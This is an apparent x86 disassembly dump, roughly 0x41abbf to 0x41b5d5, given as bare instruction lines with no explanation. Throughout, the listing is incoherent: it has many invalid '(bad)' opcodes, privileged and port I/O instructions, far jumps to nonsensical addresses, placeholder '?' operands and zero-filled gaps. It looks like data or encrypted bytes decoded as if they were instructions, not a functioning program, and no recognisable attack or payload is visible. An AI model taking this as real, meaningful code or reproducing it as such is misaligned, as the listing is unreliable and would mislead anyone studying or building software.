  41abbf:	xor    DWORD PTR [edx+ecx*8+0x1df89b2a],eax
  41abc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abc7:	mov    ah,0xb
  41abc9:	dec    eax
  41abca:	sub    eax,0x990c554d
  41abcf:	pop    ds
  41abd0:	add    edx,DWORD PTR [edx]
  41abd2:	sub    BYTE PTR [edx],cl
  41abd4:	daa    
  41abd5:	jecxz  0x41ab5e
  41abd7:	inc    esi
  41abd8:	xor    DWORD PTR [ecx-0x4e143f49],edx
  41abde:	jge    0x41abfd
  41abe0:	daa    
  41abe1:	sub    DWORD PTR [esi],0x6624ff20
  41abe7:	enter  0x1c1f,0x4b
  41abeb:	loope  0x41abbc
  41abed:	fnstenv [eax-0x1f]
  41abf0:	or     eax,0x65638458
  41abf5:	(bad)
  41abf9:	lods   al,BYTE PTR ds:[esi]
  41abfa:	mov    WORD PTR [ebp+0x60922723],es
  41ac00:	push   ss
  41ac01:	dec    eax
  41ac02:	imul   edx,DWORD PTR [ebp-0x6b],0x8
  41ac06:	push   cs
  41ac07:	pop    eax
  41ac08:	stos   BYTE PTR es:[edi],al
  41ac09:	fisttp WORD PTR [ebx+0x4c970271]
  41ac0f:	and    al,BYTE PTR [eax]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+ecx*1-0x47]
  41ac82:	imul   ecx,DWORD PTR [ecx+0x0],0x1c
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    al,0x1
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	or     eax,0x5f120ab8
  41ac91:	lock rcl BYTE PTR [esi],1
  41ac94:	push   esi
  41ac95:	scas   eax,DWORD PTR es:[edi]
  41ac96:	pop    ebp
  41ac97:	mov    dl,0xce
  41ac99:	cdq    
  41ac9a:	or     BYTE PTR [ebp+0x471a59c6],cl
  41aca0:	dec    eax
  41aca1:	hlt    
  41aca2:	test   eax,edi
  41aca4:	fist   WORD PTR [esi+0x4d810b4a]
  41acaa:	dec    ebx
  41acab:	jmp    0x7efc8f56
  41acb0:	push   ebp
  41acb1:	or     al,0xfc
  41acb3:	inc    esp
  41acb4:	fbstp  TBYTE PTR [ebx-0x7a]
  41acb7:	jnp    0x41ac8d
  41acb9:	push   esi
  41acba:	hlt    
  41acbb:	sti    
  41acbc:	or     bl,BYTE PTR [ebp-0x10]
  41acbf:	or     DWORD PTR [edi],eax
  41acc1:	ja     0x41ac52
  41acc3:	enter  0x96b4,0x56
  41acc7:	daa    
  41acc8:	add    edi,ebx
  41acca:	call   0x5a341fcc
  41accf:	adc    al,0x7e
  41acd1:	aaa    
  41acd2:	inc    esi
  41acd3:	test   DWORD PTR [ebx+0x54a81ee3],ecx
  41acd9:	adc    edi,DWORD PTR [eax]
  41acdb:	xor    al,0x8a
  41acdd:	mov    ?,WORD PTR [ecx+esi*8+0x100dc487]
  41ace4:	fld    TBYTE PTR [eax-0x625da83f]
  41acea:	das    
  41aceb:	repz cmp eax,0x39c7a08
  41acf1:	fwait
  41acf2:	in     eax,dx
  41acf3:	lods   eax,DWORD PTR ds:[esi]
  41acf4:	fiadd  DWORD PTR [esi+0x11]
  41acf7:	xchg   edi,eax
  41acf8:	mov    esp,?
  41acfa:	mov    eax,ds:0x62d79ce5
  41acff:	retf   0x4eb
  41ad02:	mov    dl,BYTE PTR [ecx-0x16]
  41ad05:	pop    ecx
  41ad06:	cld    
  41ad07:	js     0x41ad1f
  41ad09:	cli    
  41ad0a:	or     DWORD PTR [ebx],esp
  41ad0c:	fcom   DWORD PTR [edx+0x4d]
  41ad0f:	out    dx,al
  41ad10:	or     ah,dl
  41ad12:	pushf  
  41ad13:	mov    bh,0x86
  41ad15:	mov    cl,0x83
  41ad17:	rol    DWORD PTR [ebp+esi*8-0x5f],cl
  41ad1b:	sub    WORD PTR [ebx-0x7a],sp
  41ad1f:	test   BYTE PTR [eax+0x5c],0xd3
  41ad23:	retf   0xe942
  41ad26:	mov    ecx,0x2c1c258b
  41ad2b:	inc    edi
  41ad2c:	sti    
  41ad2d:	icebp  
  41ad2e:	xchg   ebp,eax
  41ad2f:	jl     0x41acb6
  41ad31:	out    0xc1,al
  41ad33:	pop    ds
  41ad34:	or     BYTE PTR [ecx-0xea33f12],bl
  41ad3a:	fcmovu st,st(2)
  41ad3c:	sub    cl,BYTE PTR [eax+0x297e510a]
  41ad42:	in     eax,dx
  41ad43:	or     al,0x5f
  41ad45:	mov    BYTE PTR [edx],dl
  41ad47:	jne    0x41ad10
  41ad49:	pushf  
  41ad4a:	adc    DWORD PTR [eax],esi
  41ad4c:	or     eax,0xc3c76058
  41ad51:	cmp    al,0x8d
  41ad53:	add    BYTE PTR [edx-0x2e9f638d],0x2b
  41ad5a:	inc    esp
  41ad5b:	xor    ah,BYTE PTR [ebp+0x17409996]
  41ad61:	or     bh,BYTE PTR [ecx+ecx*4+0x1825e085]
  41ad68:	aas    
  41ad69:	test   DWORD PTR [esi],ebx
  41ad6b:	mov    bl,0x60
  41ad6d:	or     BYTE PTR [edi-0x21],bl
  41ad70:	pop    ebx
  41ad71:	inc    ebp
  41ad72:	fneni(8087 only) 
  41ad74:	jl     0x41ad18
  41ad76:	out    0x67,eax
  41ad78:	and    cl,BYTE PTR [ebp-0x395cfd12]
  41ad7e:	push   eax
  41ad7f:	xor    al,0xa3
  41ad81:	jno    0x41ad99
  41ad83:	mov    cl,0x67
  41ad85:	pop    ecx
  41ad86:	mov    cl,0x69
  41ad88:	retf   0xfc79
  41ad8b:	push   edi
  41ad8c:	mov    ebx,0x3ef8e6
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [eax+eiz*1+0x449a1a5],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	xor    eax,0x79b2f585
  41ae11:	dec    eax
  41ae12:	idiv   BYTE PTR [eax+0x1eefbbeb]
  41ae18:	sub    al,0x82
  41ae1a:	jns    0x41adbb
  41ae1c:	mov    ebx,DWORD PTR fs:[ecx]
  41ae1f:	mov    ecx,0x66ae6081
  41ae24:	pop    ebp
  41ae25:	jne    0x41ae34
  41ae27:	fidiv  WORD PTR gs:[eax+0x7b]
  41ae2b:	retf   0x93a3
  41ae2e:	xor    BYTE PTR [ebx-0x7a06304a],0xbb
  41ae35:	(bad)  
  41ae37:	push   ebp
  41ae38:	ret    0x258e
  41ae3b:	sub    eax,0x13b66895
  41ae40:	jp     0x41ae5c
  41ae42:	inc    ecx
  41ae43:	mov    al,0x7b
  41ae45:	rcl    DWORD PTR [edi-0x18],0xf1
  41ae49:	scas   al,BYTE PTR es:[edi]
  41ae4a:	enter  0x4a0f,0x32
  41ae4e:	dec    esi
  41ae4f:	dec    eax
  41ae50:	mul    DWORD PTR fs:[edi-0x1b55b55f]
  41ae57:	test   al,0xc7
  41ae59:	sub    DWORD PTR [ebx+0x1661f80d],ebp
  41ae5f:	call   0xf9ca43b4
  41ae64:	ret    0x109d
  41ae67:	dec    ebp
  41ae68:	mov    ebx,0x7eedd6c
  41ae6d:	and    edi,DWORD PTR [eax-0x27]
  41ae70:	jle    0x41aeb9
  41ae72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae73:	dec    ebx
  41ae74:	ror    BYTE PTR [ecx+0x76],cl
  41ae77:	daa    
  41ae78:	(bad)  [edx-0x148cd6b9]
  41ae7e:	jbe    0x41ae7c
  41ae80:	push   esi
  41ae81:	fadd   DWORD PTR [ecx]
  41ae83:	or     esp,edx
  41ae85:	sar    BYTE PTR [ebx-0x72a63229],cl
  41ae8b:	push   edi
  41ae8c:	scas   eax,DWORD PTR es:[edi]
  41ae8d:	fidivr DWORD PTR [edi+0x376bec14]
  41ae93:	push   ecx
  41ae94:	mov    al,0x25
  41ae96:	inc    ebx
  41ae97:	arpl   cx,dx
  41ae99:	pop    ds
  41ae9a:	pop    edi
  41ae9b:	fldln2 
  41ae9d:	fiadd  DWORD PTR [edi]
  41ae9f:	aam    0xfa
  41aea1:	scas   al,BYTE PTR es:[edi]
  41aea2:	mov    ebx,0x87f5045a
  41aea7:	lods   al,BYTE PTR ds:[esi]
  41aea8:	sub    bh,BYTE PTR [esi-0xa]
  41aeab:	sbb    al,al
  41aead:	popf   
  41aeae:	sub    al,0x40
  41aeb0:	shr    BYTE PTR [ebp-0x6],cl
  41aeb3:	push   ecx
  41aeb4:	mov    ebx,0xaf0cdf5c
  41aeb9:	cmc    
  41aeba:	pop    eax
  41aebb:	mov    DWORD PTR [ebx+esi*8+0x3e16604],edi
  41aec2:	mov    BYTE PTR [eax+edx*2-0xd59555],cl
  41aec9:	(bad)  
  41aeca:	xor    al,0x4c
  41aecc:	sub    eax,ebx
  41aece:	cmp    bl,BYTE PTR [ebx+0x73]
  41aed1:	int3   
  41aed2:	aas    
  41aed3:	repz sub esp,DWORD PTR [ebp-0x1cb108f0]
  41aeda:	dec    edi
  41aedb:	mov    ebx,0xaa9850a0
  41aee0:	(bad)  
  41aee1:	adc    BYTE PTR ds:0xaba1c05d,dl
  41aee7:	pop    ecx
  41aee8:	cmp    al,0x9c
  41aeea:	ret    0x1957
  41aeed:	(bad)  
  41aeee:	jo     0x41ae8d
  41aef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef1:	mov    ecx,0x2e2313c3
  41aef6:	adc    al,0x5a
  41aef8:	mov    dh,0x3
  41aefa:	xchg   BYTE PTR [eax+edi*2],cl
  41aefd:	pushf  
  41aefe:	mov    dh,0x8c
  41af00:	jg     0x41af17
  41af02:	and    eax,DWORD PTR [ebx]
  41af04:	jmp    0x41af53
  41af06:	(bad)  
  41af07:	ror    bh,cl
  41af09:	xor    ebx,ebp
  41af0b:	cmp    BYTE PTR [edx+0xfd6ded],0x0
	...
  41af72:	add    BYTE PTR [eax],al
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x548d44ee
  41af82:	mov    ds:0x11e0814,al
  41af87:	add    BYTE PTR [ecx+eax*1],al
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	std    
  41af8d:	pop    eax
  41af8e:	pop    ds
  41af8f:	add    ch,BYTE PTR [edi+0x2cf89ee2]
  41af95:	sbb    dl,BYTE PTR [ecx-0x64]
  41af98:	scas   eax,DWORD PTR es:[edi]
  41af99:	or     dl,bl
  41af9b:	push   ebp
  41af9c:	mov    edi,0xf4acd91e
  41afa1:	mov    edx,0x887d24c2
  41afa6:	push   cs
  41afa7:	xor    ah,BYTE PTR [ecx]
  41afa9:	pop    ecx
  41afaa:	xchg   esi,eax
  41afab:	pusha  
  41afac:	push   edx
  41afad:	push   ecx
  41afae:	cmp    DWORD PTR [ecx],edx
  41afb0:	stos   DWORD PTR es:[edi],eax
  41afb1:	or     BYTE PTR [edx],ah
  41afb3:	je     0x41af88
  41afb5:	les    edi,FWORD PTR [esi+0x51]
  41afb8:	add    esi,ebx
  41afba:	in     al,0xc6
  41afbc:	je     0x41af4e
  41afbe:	xchg   edx,eax
  41afbf:	mov    ds:0xd8906937,al
  41afc4:	das    
  41afc5:	xor    esp,DWORD PTR [edi+0x6d90e86]
  41afcb:	ins    BYTE PTR es:[edi],dx
  41afcc:	or     BYTE PTR cs:[eax],cl
  41afcf:	loop   0x41afb2
  41afd1:	ins    BYTE PTR es:[edi],dx
  41afd2:	add    al,0x50
  41afd4:	idiv   DWORD PTR ds:0xedb95e75
  41afda:	jp     0x41afcd
  41afdc:	repz adc BYTE PTR [esi],0xe2
  41afe0:	add    ecx,DWORD PTR [edi+0x4c]
  41afe3:	lock pop edi
  41afe5:	sub    bl,BYTE PTR [ebp+esi*1-0x39e04548]
  41afec:	and    DWORD PTR [ebx],edi
  41afee:	jo     0x41afa6
  41aff0:	dec    ecx
  41aff1:	popa   
  41aff2:	mov    ebx,DWORD PTR [ecx-0x27]
  41aff5:	mov    ah,0xd6
  41aff7:	fst    st(7)
  41aff9:	ins    BYTE PTR es:[edi],dx
  41affa:	(bad)  
  41affb:	repz xor DWORD PTR [edi],edi
  41affe:	pusha  
  41afff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b000:	jp     0x41aff9
  41b002:	add    DWORD PTR [edi+ebp*8-0x54],edx
  41b006:	add    bh,BYTE PTR [ecx+0xf]
  41b009:	jle    0x41afb1
  41b00b:	fwait
  41b00c:	int    0xbb
  41b00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00f:	pop    edx
  41b010:	shl    BYTE PTR fs:[esi-0x6a30254d],0xb4
  41b018:	aaa    
  41b019:	cmp    al,0xb2
  41b01b:	jne    0x41b095
  41b01d:	lea    esi,[esi-0x605e3a23]
  41b023:	std    
  41b024:	cwde   
  41b025:	push   ebp
  41b026:	ret    0xebec
  41b029:	adc    al,0x82
  41b02b:	cmp    al,0xae
  41b02d:	lods   eax,DWORD PTR ds:[esi]
  41b02e:	scas   al,BYTE PTR es:[edi]
  41b02f:	ret    
  41b030:	iret   
  41b031:	icebp  
  41b032:	add    BYTE PTR [eax],ch
  41b034:	pop    esp
  41b035:	cmc    
  41b036:	xchg   edi,ebp
  41b038:	dec    ebp
  41b039:	fimul  DWORD PTR [eax+0x36f4b2e1]
  41b03f:	enter  0xad39,0x2f
  41b043:	popf   
  41b044:	scas   eax,DWORD PTR es:[edi]
  41b045:	jmp    0xac75:0xbfd1da54
  41b04c:	aad    0x41
  41b04e:	xchg   ecx,eax
  41b04f:	in     al,0x8b
  41b051:	xchg   edi,eax
  41b052:	popa   
  41b053:	mov    ds:0x78b293fd,eax
  41b058:	sub    ch,al
  41b05a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b05b:	add    eax,0x6d6ac41b
  41b060:	test   DWORD PTR [ecx-0x7c],ebp
  41b063:	mov    eax,0x65ce591e
  41b068:	inc    eax
  41b069:	enter  0xc04b,0x2e
  41b06d:	rcr    BYTE PTR [ebp+0x56],1
  41b070:	inc    esi
  41b071:	cli    
  41b072:	repz mov al,ds:0x9a64b8cf
  41b078:	cmp    eax,0xd3d744ab
  41b07d:	mov    ebx,es
  41b07f:	imul   edi,DWORD PTR [esp+eiz*4],0x4a
  41b083:	sbb    DWORD PTR [esi],edx
  41b085:	pop    eax
  41b086:	push   0xc0888451
  41b08b:	cmp    DWORD PTR [edx+0x78f3a8],edi
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xbdf5267e
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	or     cl,BYTE PTR [eax+0x4441374e]
  41b112:	jae    0x41b0b0
  41b114:	cmp    edx,DWORD PTR ss:[edx+0x27]
  41b118:	dec    edi
  41b119:	sbb    ch,BYTE PTR [ebp+0x282202f0]
  41b11f:	lds    ebx,FWORD PTR [ebp+0x32bdc563]
  41b125:	sti    
  41b126:	sbb    esi,DWORD PTR [edx-0x1f]
  41b129:	addr16 cmp eax,0xa28c91f1
  41b12f:	sar    DWORD PTR [ebp-0x5],0x5c
  41b133:	retf   
  41b134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b136:	aaa    
  41b137:	xor    al,0x6
  41b139:	cmp    BYTE PTR [edi+0x3f],al
  41b13c:	xlat   BYTE PTR ds:[ebx]
  41b13d:	and    BYTE PTR [ebp-0x6f6b9189],ch
  41b143:	fmul   st,st(3)
  41b145:	jno    0x41b1af
  41b147:	loop   0x41b183
  41b149:	gs in  eax,dx
  41b14b:	pop    edx
  41b14c:	fdiv   QWORD PTR [ebp-0x681bfed5]
  41b152:	adc    eax,0xf57f412a
  41b157:	mov    edi,0x97a4a53b
  41b15c:	inc    edi
  41b15d:	loopne 0x41b194
  41b15f:	ja     0x41b17f
  41b161:	scas   al,BYTE PTR es:[edi]
  41b162:	aad    0x99
  41b164:	pop    ebx
  41b165:	push   edx
  41b166:	push   edx
  41b167:	push   edx
  41b168:	fsub   DWORD PTR [ebp+eiz*2+0x6f]
  41b16c:	lods   al,BYTE PTR ds:[esi]
  41b16d:	jae    0x41b10c
  41b16f:	int    0xe9
  41b171:	mov    bl,0xe
  41b173:	(bad)  
  41b174:	pop    edi
  41b175:	outs   dx,DWORD PTR ds:[esi]
  41b176:	push   0x2bb23876
  41b17b:	mov    edi,0x547268e7
  41b180:	mov    ds:0xcff5810c,al
  41b185:	int    0xa1
  41b187:	adc    dl,BYTE PTR [edi-0x14762df0]
  41b18d:	idiv   edx
  41b18f:	push   eax
  41b190:	push   edi
  41b191:	push   edx
  41b192:	jmp    WORD PTR [edx-0x4c]
  41b196:	mov    ah,0x2f
  41b198:	pop    ebx
  41b199:	mov    eax,ds:0xa131e956
  41b19e:	repnz out dx,eax
  41b1a0:	test   al,0x7b
  41b1a2:	and    ch,al
  41b1a4:	shr    eax,0x3c
  41b1a7:	and    edx,edx
  41b1a9:	(bad)  
  41b1aa:	mov    esi,0x36ad30f8
  41b1af:	and    esp,DWORD PTR [eax+0x3d543016]
  41b1b5:	pop    ss
  41b1b6:	test   eax,0x314a383
  41b1bb:	mov    esp,DWORD PTR [edx-0x65]
  41b1be:	mov    ch,0xb4
  41b1c0:	mov    ebx,DWORD PTR [ebp+esi*2+0x28]
  41b1c4:	out    dx,eax
  41b1c5:	(bad)  
  41b1c6:	div    DWORD PTR [esi+0x0]
  41b1c9:	(bad)  
  41b1ca:	jle    0x41b1ce
  41b1cc:	cwde   
  41b1cd:	ret    
  41b1ce:	push   esi
  41b1cf:	sbb    al,0x71
  41b1d1:	add    al,0xd9
  41b1d3:	cmc    
  41b1d4:	ds xor al,0xde
  41b1d7:	lea    ebx,[esi]
  41b1d9:	push   ebx
  41b1da:	or     ebx,DWORD PTR [esi+0x26]
  41b1dd:	out    0x5a,al
  41b1df:	jne    0x41b1e0
  41b1e1:	fcmovbe st,st(3)
  41b1e3:	enter  0x6ce5,0xd4
  41b1e7:	(bad)  
  41b1e8:	stos   BYTE PTR es:[edi],al
  41b1e9:	adc    edx,esi
  41b1eb:	push   edi
  41b1ec:	fxch   st(5)
  41b1ee:	add    DWORD PTR [ebx-0x64],eax
  41b1f1:	inc    ebp
  41b1f2:	call   0xaf90:0xd26233a2
  41b1f9:	in     al,dx
  41b1fa:	mov    ?,WORD PTR [edx-0x57]
  41b1fd:	mov    edi,0xf86473ba
  41b202:	pop    ebp
  41b203:	inc    ecx
  41b204:	and    DWORD PTR [esi+0x5d],edx
  41b207:	in     al,0x3c
  41b209:	xor    dh,BYTE PTR [eax-0x65]
  41b20c:	jnp    0x41b264
  41b20e:	(bad)  
  41b20f:	repz add BYTE PTR [eax],al
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [eax],ah
  41b281:	pop    ebx
  41b282:	mov    esi,DWORD PTR [eax+0x12010]
  41b288:	add    al,0x1
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	jmp    0x41b2ed
  41b28e:	jl     0x41b252
  41b290:	jns    0x41b2e6
  41b292:	pop    esp
  41b293:	sub    edi,ecx
  41b295:	or     al,0xc0
  41b297:	(bad)  
  41b298:	shr    DWORD PTR [edx],0xc9
  41b29b:	add    ch,dh
  41b29d:	fisub  DWORD PTR [eax+eiz*4-0x28de27c5]
  41b2a4:	jmp    0xf4b8:0x745fd2a9
  41b2ab:	jb     0x41b2af
  41b2ad:	in     eax,dx
  41b2ae:	sub    esp,DWORD PTR [eax]
  41b2b0:	mov    edx,0xb6d45c64
  41b2b5:	mov    bh,0x81
  41b2b7:	out    dx,al
  41b2b8:	test   DWORD PTR [edi],0xa7b4bea2
  41b2be:	xchg   BYTE PTR [ebp+ecx*2+0x8],ch
  41b2c2:	fnstcw WORD PTR [eax+0x253902d7]
  41b2c8:	out    0xcf,eax
  41b2ca:	mov    eax,0xdf046c11
  41b2cf:	aas    
  41b2d0:	into   
  41b2d1:	outs   dx,DWORD PTR ds:[esi]
  41b2d2:	icebp  
  41b2d3:	mov    DWORD PTR [eax+0x8],0x24e7b278
  41b2da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2db:	pop    eax
  41b2dc:	lea    ecx,[ecx-0x6ad3f69c]
  41b2e2:	ja     0x41b2a9
  41b2e4:	cwde   
  41b2e5:	inc    eax
  41b2e6:	sub    dh,BYTE PTR [ebx-0x2e807b06]
  41b2ec:	clc    
  41b2ed:	pop    ecx
  41b2ee:	mov    ds:0x2d0e34d1,al
  41b2f3:	jb     0x41b2d9
  41b2f5:	and    eax,0x542fed5d
  41b2fa:	sbb    eax,0xd4ddaa66
  41b2ff:	push   0xae2022c5
  41b304:	imul   BYTE PTR gs:[edi+0x2ab3a778]
  41b30b:	or     al,cl
  41b30d:	jle    0x41b309
  41b30f:	(bad)
  41b314:	mov    ah,0x87
  41b316:	cmp    ebp,0x16c4f57c
  41b31c:	adc    cl,ah
  41b31e:	mov    dl,0xb8
  41b320:	mov    cl,0x62
  41b322:	jnp    0x41b324
  41b324:	das    
  41b325:	es jns 0x41b2cd
  41b328:	jb     0x41b342
  41b32a:	addr16 sub al,0x94
  41b32d:	push   edi
  41b32e:	daa    
  41b32f:	push   ecx
  41b330:	dec    ebp
  41b331:	jns    0x41b2e7
  41b333:	jp     0x41b2f7
  41b335:	mov    ?,WORD PTR [edi-0x46]
  41b338:	int3   
  41b339:	fild   QWORD PTR [ebp+0x2000ac4e]
  41b33f:	xchg   ebx,eax
  41b340:	mov    WORD PTR [edi+0x45],es
  41b343:	fisub  WORD PTR [edx+ecx*4-0x191848f2]
  41b34a:	shl    BYTE PTR [eax+ecx*2+0x6d],cl
  41b34e:	inc    edi
  41b34f:	cs xor al,0x6c
  41b352:	xchg   edx,eax
  41b353:	sub    al,0xb
  41b355:	test   DWORD PTR [edx+0x17c934c1],edi
  41b35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b35c:	add    DWORD PTR [edx],eax
  41b35e:	hlt    
  41b35f:	push   ecx
  41b360:	call   0xb4c0:0xd2049330
  41b367:	into   
  41b368:	xorps  xmm5,xmm5
  41b36b:	aaa    
  41b36c:	jecxz  0x41b382
  41b36e:	mov    bh,bh
  41b370:	push   esi
  41b371:	les    esp,FWORD PTR [edx+0x25]
  41b374:	jmp    0x9ed800fa
  41b379:	test   BYTE PTR [eax-0x54b22efb],0x79
  41b380:	inc    esp
  41b381:	outs   dx,BYTE PTR ds:[esi]
  41b382:	jge    0x41b34e
  41b384:	enter  0x3a10,0x6f
  41b388:	inc    eax
  41b389:	outs   dx,BYTE PTR ds:[esi]
  41b38a:	inc    eax
  41b38b:	xchg   edx,eax
  41b38c:	int3   
  41b38d:	gs pushf 
  41b38f:	sldt   WORD PTR [eax]
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	loopne 0x41b414
  41b402:	cli    
  41b403:	sbb    edx,DWORD PTR [ecx+eiz*1]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	add    BYTE PTR [edx+0x16bfeb4a],dl
  41b412:	daa    
  41b413:	pop    esp
  41b414:	mov    ds:0x569cc1b4,eax
  41b419:	pop    ebp
  41b41a:	adc    al,0x99
  41b41c:	lahf   
  41b41d:	aas    
  41b41e:	sub    ah,BYTE PTR [edi+0x662ab685]
  41b424:	push   edi
  41b425:	cmc    
  41b426:	ja     0x41b3e9
  41b428:	retf   
  41b429:	mov    al,0xba
  41b42b:	inc    edx
  41b42c:	retf   0x2ffa
  41b42f:	dec    esi
  41b430:	cmp    bl,BYTE PTR [edx+0x3da61956]
  41b436:	lods   eax,DWORD PTR ds:[esi]
  41b437:	pop    ecx
  41b438:	mov    ah,0x3d
  41b43a:	or     ecx,esi
  41b43c:	jnp    0x41b46b
  41b43e:	bound  ebx,QWORD PTR ds:0x556b6316
  41b444:	mov    ecx,edi
  41b446:	imul   DWORD PTR [edx]
  41b448:	hlt    
  41b449:	iret   
  41b44a:	je     0x41b4b6
  41b44c:	les    edi,FWORD PTR [esp+ebp*1+0x37d2c12f]
  41b453:	fidiv  DWORD PTR ds:0x5b40be2e
  41b459:	sbb    eax,0x6e916dcb
  41b45e:	js     0x41b43e
  41b460:	and    al,0xc3
  41b462:	pusha  
  41b463:	stc    
  41b464:	push   esp
  41b465:	ret    
  41b466:	fsub   st(5),st
  41b468:	mov    cl,0x88
  41b46a:	jbe    0x41b464
  41b46c:	push   es
  41b46d:	sub    DWORD PTR [esp-0x610b78b2],ecx
  41b474:	leave  
  41b475:	lahf   
  41b476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b477:	into   
  41b478:	imul   ebp,edi,0x4
  41b47b:	retf   
  41b47c:	adc    eax,0x6878e5e7
  41b481:	pop    esi
  41b482:	ds scas eax,DWORD PTR es:[edi]
  41b484:	cmp    eax,0x8155d815
  41b489:	rol    DWORD PTR [ecx],0x3a
  41b48c:	and    DWORD PTR [ebx-0x5d9ef89a],eax
  41b492:	fadd   st,st(7)
  41b494:	or     DWORD PTR [edx-0x24],ebx
  41b497:	test   al,0xa8
  41b499:	sbb    cl,BYTE PTR [ebp-0x321857f1]
  41b49f:	pop    ecx
  41b4a0:	loop   0x41b49f
  41b4a2:	sbb    edi,DWORD PTR [esp+ebp*8+0x34]
  41b4a6:	xor    DWORD PTR [edx],edx
  41b4a8:	adc    BYTE PTR [eax],ch
  41b4aa:	mov    WORD PTR [ebp-0x67],ss
  41b4ad:	daa    
  41b4ae:	data16 repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4b1:	(bad)  
  41b4b2:	xchg   edi,eax
  41b4b3:	jl     0x41b4d7
  41b4b5:	mov    edx,0x58b8ee28
  41b4ba:	cdq    
  41b4bb:	imul   esp,DWORD PTR [edi-0x4f],0xffffffee
  41b4bf:	sahf   
  41b4c0:	fild   WORD PTR [ebx+0x38179f34]
  41b4c6:	add    BYTE PTR [ebx-0x6052a51b],dh
  41b4cc:	and    eax,0xcb822749
  41b4d1:	fistp  WORD PTR [ebx+0x427891df]
  41b4d7:	mov    al,0xf
  41b4d9:	cmp    eax,0x768f4e5c
  41b4de:	retf   0x1545
  41b4e1:	pop    es
  41b4e2:	push   0xffffff9c
  41b4e4:	clc    
  41b4e5:	repnz mov ch,0xe4
  41b4e8:	loope  0x41b50e
  41b4ea:	inc    edx
  41b4eb:	push   edi
  41b4ec:	ins    DWORD PTR es:[edi],dx
  41b4ed:	xchg   ebx,eax
  41b4ee:	mov    edi,edi
  41b4f0:	loopne 0x41b4b8
  41b4f2:	mov    al,0x92
  41b4f4:	mov    eax,0xc26beb9a
  41b4f9:	(bad)  
  41b4fa:	call   0xe016254a
  41b4ff:	and    ebx,DWORD PTR [ecx+0x60ccbc17]
  41b505:	sub    eax,0xff9ac962
  41b50a:	addr16 in al,dx
  41b50c:	inc    DWORD PTR [edi]
  41b50e:	in     al,0x78
	...
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	add    BYTE PTR [ecx+0x22183eb8],0x1
  41b587:	add    BYTE PTR [ecx+eax*1],al
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	sbb    ch,BYTE PTR [ecx]
  41b58e:	sbb    eax,0x6a25fabe
  41b593:	ret    0xb139
  41b596:	xchg   ebx,eax
  41b597:	rcl    BYTE PTR [eax+esi*1],1
  41b59a:	imul   ecx,DWORD PTR [esi+esi*8],0x1b
  41b59e:	imul   ebp,DWORD PTR [edx],0xc5a01a97
  41b5a4:	xchg   BYTE PTR [eax+ecx*8],cl
  41b5a7:	or     DWORD PTR [edx+0x30],edi
  41b5aa:	test   DWORD PTR [eax],esi
  41b5ac:	repz in al,0x1e
  41b5af:	shr    DWORD PTR [esi-0x11],0x73
  41b5b3:	mov    eax,0x892991ca
  41b5b8:	jb     0x41b567
  41b5ba:	ret    0xf5cf
  41b5bd:	aas    
  41b5be:	inc    eax
  41b5bf:	push   esp
  41b5c0:	push   ecx
  41b5c1:	and    ebx,DWORD PTR [edx]
  41b5c3:	mov    ds:0x7470ae23,al
  41b5c8:	xchg   edi,eax
  41b5c9:	push   eax
  41b5ca:	loop   0x41b5b5
  41b5cc:	arpl   WORD PTR [esi+0x6b],ax
  41b5cf:	enter  0x17e2,0x75
  41b5d3:	(bad)  
  41b5d4:	daa    
  41b5d5:	xor    eax,0xc583e9d1
